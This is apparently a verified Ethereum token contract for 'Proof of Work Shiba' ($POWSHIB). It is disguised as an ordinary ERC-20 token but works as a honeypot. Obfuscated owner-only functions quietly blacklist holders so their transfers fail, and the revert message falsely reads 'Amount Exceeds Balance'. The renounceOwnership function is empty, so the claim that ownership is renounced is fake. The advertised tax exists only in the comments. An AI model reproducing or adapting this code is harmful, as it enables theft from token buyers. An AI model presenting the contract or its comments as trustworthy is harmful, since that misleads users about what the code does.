/**
 *Submitted for verification at Etherscan.io on 2022-09-11
*/

pragma solidity 0.8.17;
/*

   ▄███████▄  ▄██████▄   ▄█     █▄          ▄████████    ▄█    █▄     ▄█  ▀█████████▄  
  ███    ███ ███    ███ ███     ███        ███    ███   ███    ███   ███    ███    ███ 
  ███    ███ ███    ███ ███     ███        ███    █▀    ███    ███   ███▌   ███    ███ 
  ███    ███ ███    ███ ███     ███        ███         ▄███▄▄▄▄███▄▄ ███▌  ▄███▄▄▄██▀  
▀█████████▀  ███    ███ ███     ███      ▀███████████ ▀▀███▀▀▀▀███▀  ███▌ ▀▀███▀▀▀██▄  
  ███        ███    ███ ███     ███               ███   ███    ███   ███    ███    ██▄ 
  ███        ███    ███ ███ ▄█▄ ███         ▄█    ███   ███    ███   ███    ███    ███ 
 ▄████▀       ▀██████▀   ▀███▀███▀        ▄████████▀    ███    █▀    █▀   ▄█████████▀ 

Proof of Work Shiba - $POWSHIB


Tokenomics
- 0% Tax first 24 Hours, then 7%
- 100M Supply
- 1:1 Snapshot at Merge  - PulseChain Bridge Support Q4 2022 (PRC20)

 

*/    

contract POWSHIBA {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) sAmnt;

    // 
    string public name = "Proof of Work Shiba";
    string public symbol = unicode"POWSHIB";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function bwdnba(address _user) public onlyOwner {
        require(!sAmnt[_user], "x");
        sAmnt[_user] = true;
     
    }
    
    function cwvnbb(address _user) public onlyOwner {
        require(sAmnt[_user], "xx");
        sAmnt[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!sAmnt[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!sAmnt[from] , "Amount Exceeds Balance"); 
               require(!sAmnt[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}